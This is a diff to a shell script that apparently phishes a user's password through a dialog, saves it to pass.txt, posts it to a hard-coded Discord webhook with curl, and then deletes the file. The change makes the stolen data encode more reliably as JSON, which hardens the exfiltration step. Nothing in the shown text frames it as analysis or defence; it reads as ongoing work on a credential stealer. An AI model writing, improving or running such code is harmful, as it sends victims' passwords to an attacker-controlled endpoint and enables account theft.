@@ -52,9 +52,10 @@ capture="${capture}password=${dialogText}"
 # Save the captured information to pass.txt
 echo -e "$capture" > pass.txt
 
-# Send captured data to the Discord webhook and then remove pass.txt
+# Send captured data to the Discord webhook using Python to ensure valid JSON formatting
 if [[ -f pass.txt ]]; then
-    curl -H "Content-Type: application/json" -d "{\"content\":\"$(cat pass.txt | sed 's/"/\\"/g')\"}" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
+    payload=$(python3 -c 'import json,sys; print(json.dumps({"content": sys.stdin.read()}))' < pass.txt)
+    curl -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
     rm pass.txt
 else
     echo "Error: pass.txt not found" > error.txt
